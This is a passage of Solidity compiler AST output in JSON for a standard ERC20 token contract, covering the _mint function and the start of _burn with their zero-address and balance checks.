																			"typeString": "int_const 0"
																		}
																	],
																	"id": 357,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "8614:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": {
																		"id": 356,
																		"name": "address",
																		"nodeType": "ElementaryTypeName",
																		"src": "8614:7:0",
																		"typeDescriptions": {}
																	}
																},
																"id": 359,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "typeConversion",
																"lValueRequested": false,
																"nameLocations": [],
																"names": [],
																"nodeType": "FunctionCall",
																"src": "8614:10:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"src": "8603:21:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"hexValue": "45524332303a206d696e7420746f20746865207a65726f2061646472657373",
															"id": 361,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "8626:33:0",
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_fc0b381caf0a47702017f3c4b358ebe3d3aff6c60ce819a8bf3ef5a95d4f202e",
																"typeString": "literal_string \"ERC20: mint to the zero address\""
															},
															"value": "ERC20: mint to the zero address"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_fc0b381caf0a47702017f3c4b358ebe3d3aff6c60ce819a8bf3ef5a95d4f202e",
																"typeString": "literal_string \"ERC20: mint to the zero address\""
															}
														],
														"id": 354,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967278,
															4294967278
														],
														"referencedDeclaration": 4294967278,
														"src": "8595:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 362,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8595:65:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 363,
												"nodeType": "ExpressionStatement",
												"src": "8595:65:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"arguments": [
																{
																	"hexValue": "30",
																	"id": 367,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "8700:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	}
																],
																"id": 366,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "8692:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 365,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "8692:7:0",
																	"typeDescriptions": {}
																}
															},
															"id": 368,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "8692:10:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 369,
															"name": "account",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 349,
															"src": "8704:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 370,
															"name": "amount",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 351,
															"src": "8713:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 364,
														"name": "_beforeTokenTransfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 574,
														"src": "8671:20:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 371,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8671:49:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 372,
												"nodeType": "ExpressionStatement",
												"src": "8671:49:0"
											},
											{
												"expression": {
													"id": 375,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 373,
														"name": "_totalSupply",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 23,
														"src": "8731:12:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "+=",
													"rightHandSide": {
														"id": 374,
														"name": "amount",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 351,
														"src": "8747:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "8731:22:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 376,
												"nodeType": "ExpressionStatement",
												"src": "8731:22:0"
											},
											{
												"id": 383,
												"nodeType": "UncheckedBlock",
												"src": "8763:175:0",
												"statements": [
													{
														"expression": {
															"id": 381,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftHandSide": {
																"baseExpression": {
																	"id": 377,
																	"name": "_balances",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 15,
																	"src": "8899:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 379,
																"indexExpression": {
																	"id": 378,
																	"name": "account",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 349,
																	"src": "8909:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": true,
																"nodeType": "IndexAccess",
																"src": "8899:18:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "Assignment",
															"operator": "+=",
															"rightHandSide": {
																"id": 380,
																"name": "amount",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 351,
																"src": "8921:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "8899:28:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 382,
														"nodeType": "ExpressionStatement",
														"src": "8899:28:0"
													}
												]
											},
											{
												"eventCall": {
													"arguments": [
														{
															"arguments": [
																{
																	"hexValue": "30",
																	"id": 387,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "8969:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	}
																],
																"id": 386,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "8961:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 385,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "8961:7:0",
																	"typeDescriptions": {}
																}
															},
															"id": 388,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "8961:10:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 389,
															"name": "account",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 349,
															"src": "8973:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 390,
															"name": "amount",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 351,
															"src": "8982:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 384,
														"name": "Transfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 598,
														"src": "8952:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 391,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8952:37:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 392,
												"nodeType": "EmitStatement",
												"src": "8947:42:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"arguments": [
																{
																	"hexValue": "30",
																	"id": 396,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "9028:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	}
																],
																"id": 395,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "9020:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 394,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "9020:7:0",
																	"typeDescriptions": {}
																}
															},
															"id": 397,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "9020:10:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 398,
															"name": "account",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 349,
															"src": "9032:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 399,
															"name": "amount",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 351,
															"src": "9041:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 393,
														"name": "_afterTokenTransfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 585,
														"src": "9000:19:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 400,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "9000:48:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 401,
												"nodeType": "ExpressionStatement",
												"src": "9000:48:0"
											}
										]
									},
									"documentation": {
										"id": 347,
										"nodeType": "StructuredDocumentation",
										"src": "8250:265:0",
										"text": "@dev Creates `amount` tokens and assigns them to `account`, increasing\n the total supply.\n Emits a {Transfer} event with `from` set to the zero address.\n Requirements:\n - `account` cannot be the zero address."
									},
									"id": 403,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_mint",
									"nameLocation": "8529:5:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 352,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 349,
												"mutability": "mutable",
												"name": "account",
												"nameLocation": "8543:7:0",
												"nodeType": "VariableDeclaration",
												"scope": 403,
												"src": "8535:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 348,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "8535:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 351,
												"mutability": "mutable",
												"name": "amount",
												"nameLocation": "8560:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 403,
												"src": "8552:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 350,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "8552:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "8534:33:0"
									},
									"returnParameters": {
										"id": 353,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "8585:0:0"
									},
									"scope": 586,
									"src": "8520:535:0",
									"stateMutability": "nonpayable",
									"virtual": true,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 474,
										"nodeType": "Block",
										"src": "9440:594:0",
										"statements": [
											{
												"expression": {
													"arguments": [
														{
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 417,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 412,
																"name": "account",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 406,
																"src": "9458:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "!=",
															"rightExpression": {
																"arguments": [
																	{
																		"hexValue": "30",
																		"id": 415,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "9477:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		}
																	],
																	"id": 414,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "9469:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": {
																		"id": 413,
																		"name": "address",
																		"nodeType": "ElementaryTypeName",
																		"src": "9469:7:0",
																		"typeDescriptions": {}
																	}
																},
																"id": 416,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "typeConversion",
																"lValueRequested": false,
																"nameLocations": [],
																"names": [],
																"nodeType": "FunctionCall",
																"src": "9469:10:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"src": "9458:21:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"hexValue": "45524332303a206275726e2066726f6d20746865207a65726f2061646472657373",
															"id": 418,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "9481:35:0",
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_b16788493b576042bb52c50ed56189e0b250db113c7bfb1c3897d25cf9632d7f",
																"typeString": "literal_string \"ERC20: burn from the zero address\""
															},
															"value": "ERC20: burn from the zero address"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_b16788493b576042bb52c50ed56189e0b250db113c7bfb1c3897d25cf9632d7f",
																"typeString": "literal_string \"ERC20: burn from the zero address\""
															}
														],
														"id": 411,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967278,
															4294967278
														],
														"referencedDeclaration": 4294967278,
														"src": "9450:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 419,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "9450:67:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 420,
												"nodeType": "ExpressionStatement",
												"src": "9450:67:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 422,
															"name": "account",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 406,
															"src": "9549:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"arguments": [
																{
																	"hexValue": "30",
																	"id": 425,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "9566:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	}
																],
																"id": 424,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "9558:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 423,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "9558:7:0",
																	"typeDescriptions": {}
																}
															},
															"id": 426,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "9558:10:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 427,
															"name": "amount",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 408,
															"src": "9570:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 421,
														"name": "_beforeTokenTransfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 574,
														"src": "9528:20:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 428,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "9528:49:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 429,
												"nodeType": "ExpressionStatement",
												"src": "9528:49:0"
											},
											{
												"assignments": [
													431
												],
												"declarations": [
													{
														"constant": false,
														"id": 431,
														"mutability": "mutable",
														"name": "accountBalance",
														"nameLocation": "9596:14:0",
														"nodeType": "VariableDeclaration",
														"scope": 474,
														"src": "9588:22:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 430,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "9588:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 435,
												"initialValue": {
													"baseExpression": {
														"id": 432,
														"name": "_balances",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 15,
														"src": "9613:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
															"typeString": "mapping(address => uint256)"
														}
													},
													"id": 434,
													"indexExpression": {
														"id": 433,
														"name": "account",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 406,
														"src": "9623:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "IndexAccess",
													"src": "9613:18:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "9588:43:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 439,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 437,
																"name": "accountBalance",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 431,
																"src": "9649:14:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"id": 438,
																"name": "amount",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 408,
																"src": "9667:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "9649:24:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"hexValue": "45524332303a206275726e20616d6f756e7420657863656564732062616c616e6365",
															"id": 440,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "9675:36:0",
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_149b126e7125232b4200af45303d04fba8b74653b1a295a6a561a528c33fefdd",
																"typeString": "literal_string \"ERC20: burn amount exceeds balance\""
															},
															"value": "ERC20: burn amount exceeds balance"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_149b126e7125232b4200af45303d04fba8b74653b1a295a6a561a528c33fefdd",
																"typeString": "literal_string \"ERC20: burn amount exceeds balance\""
															}
														],
														"id": 436,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967278,
															4294967278
														],
														"referencedDeclaration": 4294967278,
														"src": "9641:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 441,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "9641:71:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 442,
												"nodeType": "ExpressionStatement",
												"src": "9641:71:0"
											},
											{
												"id": 455,
												"nodeType": "UncheckedBlock",
												"src": "9722:194:0",
												"statements": [
													{
														"expression": {
															"id": 449,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftHandSide": {
																"baseExpression": {
																	"id": 443,
																	"name": "_balances",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 15,
																	"src": "9746:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 445,
																"indexExpression": {
																	"id": 444,
																	"name": "account",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 406,
																	"src": "9756:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": true,
																"nodeType": "IndexAccess",
																"src": "9746:18:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "Assignment",
															"operator": "=",
															"rightHandSide": {
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 448,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"id": 446,
																	"name": "accountBalance",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 431,
																	"src": "9767:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "-",
																"rightExpression": {
																	"id": 447,
																	"name": "amount",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 408,
																	"src": "9784:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "9767:23:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "9746:44:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 450,
														"nodeType": "ExpressionStatement",
														"src": "9746:44:0"
													},
													{
														"expression": {
															"id": 453,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftHandSide": {
																"id": 451,
																"name": "_totalSupply",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 23,
																"src": "9883:12:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "Assignment",
															"operator": "-=",
															"rightHandSide": {
																"id": 452,
																"name": "amount",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 408,
																"src": "9899:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "9883:22:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 454,
														"nodeType": "ExpressionStatement",
														"src": "9883:22:0"
													}
												]
											},
											{
												"eventCall": {
													"arguments": [
														{
															"id": 457,
															"name": "account",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 406,
															"src": "9940:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"arguments": [
																{
																	"hexValue": "30",
																	"id": 460,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "9957:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
